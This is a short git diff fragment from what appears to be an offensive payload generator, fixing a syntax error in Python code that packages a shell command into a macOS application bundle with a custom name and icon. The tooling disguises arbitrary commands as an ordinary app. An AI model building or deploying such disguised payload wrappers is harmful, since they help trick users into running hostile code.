@@ -31,7 +31,7 @@ mv payloads/macos_application/application.app payloads/macos_application/"""+nam
 mv """+icon+""" payloads/"""+name+""".app/Contents/Resources/Powershell.icns
                         """
 		payload_save_path = "payloads/macos_application/"+name+".app/Contents/MacOS/PowerShell.sh"
-                sas = "payloads/macos_application/"+name"
+                sas = "payloads/macos_application/"+name
 		payload = """\
 #! /usr/local/bin/env bash
 """+shell_command+"""
